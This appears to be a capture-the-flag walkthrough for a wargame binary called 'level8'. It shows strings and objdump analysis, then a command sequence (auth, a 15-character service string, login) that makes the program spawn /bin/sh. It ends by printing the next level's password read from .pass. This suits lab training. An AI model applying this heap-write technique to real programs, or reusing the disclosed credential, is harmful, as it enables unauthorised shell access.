
██╗     ███████╗██╗   ██╗███████╗██╗          █████╗ 
██║     ██╔════╝██║   ██║██╔════╝██║         ██╔══██╗
██║     █████╗  ██║   ██║█████╗  ██║         ╚█████╔╝
██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ██╔══██╗
███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚█████╔╝
╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚════╝ 


scp the binary file

strings level8

There are 4 interesting strings:
- auth
- service
- reset
- login

We execute the program and try to enter these keywords:

./level8

auth coucou

service coucou

reset

login

They seem to correspond to some commands.

With strings we also notice the presence of the: /bin/sh

objdump -d level8

We look for the place where the <system> function is called.
In the last command (after the 4th comparison), we have :

<+401>:	call   0x8048480 <system@plt>

This block correspond to LOGIN command.

The we have :
<+382>:	mov    0x8049aac,%eax // 0x08049aac = 0x0804a008
<+387>:	mov    0x20(%eax),%eax
<+390>:	test   %eax,%eax
<+392>:	je     0x80486ff <main+411>

It mean that we have to write 0x20(32) bytes after the address: 0x0804a008.
So we have to write a random thing at the addresse : 0x0804a028

We also notice that in the part that is corresponding to the SERVICE command (after the third cmpsb),
we writes to the address 0x0804a018.

<+327>:	call   0x8048430 <strdup@plt>
<+332>:	mov    %eax,0x8049ab0 // eax = 0x0804a018

That is 16 bytes before the address we need to write.

At SERVICE, we just have to enter at least 15 characters + the '\n' generated by pressing Enter.

./level 8

auth coucou

service AAAAAAAAAAAAAAA

login

cd ../level9 && cat .pass

|══════════════════════════════════════════════════════════════════|
| c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a |
|══════════════════════════════════════════════════════════════════|

